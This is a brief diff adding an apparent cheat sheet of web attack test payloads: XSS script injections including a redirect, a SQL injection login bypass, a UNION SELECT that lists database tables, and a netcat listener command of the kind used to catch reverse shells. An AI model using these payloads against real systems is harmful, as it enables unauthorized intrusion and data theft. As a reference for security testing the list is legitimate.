@@ -1,0 +1,10 @@
+XSS
+<script>alert('XSS test vulnerabilità');</script>
+<script>window.location.href='http://youtube.com'</script>
+
+SQL
+' OR '1'='1
+' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = 'MySQL' --'
+ 
+NETCAT
+nc -lvnp 80
